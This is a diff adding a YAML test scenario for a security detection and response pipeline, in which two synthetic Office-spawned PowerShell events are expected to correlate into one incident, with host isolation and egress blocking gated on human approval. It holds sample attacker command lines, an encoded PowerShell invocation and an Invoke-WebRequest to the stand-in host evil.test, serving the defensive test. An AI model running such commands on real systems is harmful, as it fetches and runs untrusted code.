@@ -1,0 +1,68 @@
+name: office_dropper_correlation
+description: Two suspicious Office-spawned child processes should dry-run and correlate into one incident
+seed_time_ms: 1700000100000
+requested_by: replay-whisker
+receipt_chain:
+  - seed-receipt
+metadata:
+  class: adversarial
+  campaign: hellcat.office_loader
+  techniques:
+    - T1204.002
+    - T1059.001
+    - T1105
+  tags:
+    - office
+    - correlation
+    - loader
+
+input:
+  kind: events
+  events:
+    - action:
+        type: isolate_host
+        host_id: host-ops-1
+      event:
+        source: synthetic
+        event_id: hunt-evt-1
+        timestamp: 1700000000000
+        host_id: host-ops-1
+        payload:
+          kind: process_start
+          parent_process: WINWORD
+          process_name: powershell
+          command_line: powershell.exe -enc AAA=
+          user: alice
+    - action:
+        type: block_egress
+        target: 198.51.100.20
+      event:
+        source: synthetic
+        event_id: hunt-evt-2
+        timestamp: 1700000001000
+        host_id: host-ops-1
+        payload:
+          kind: process_start
+          parent_process: OUTLOOK
+          process_name: powershell
+          command_line: powershell.exe Invoke-WebRequest https://evil.test
+          user: alice
+
+expectations:
+  replay_bundle_count: 2
+  investigation_count: 2
+  incident_count: 1
+  hunts:
+    - hunt_id: hunt-evt-1
+      action_kind: isolate_host
+      policy_verdict: require_human
+      response_kind: success
+    - hunt_id: hunt-evt-2
+      action_kind: block_egress
+      policy_verdict: require_human
+      response_kind: success
+  incident_hunt_groups:
+    - [hunt-evt-1, hunt-evt-2]
+  max_detect_latency_us: 50000
+  max_policy_latency_us: 50000
+  max_response_latency_us: 50000
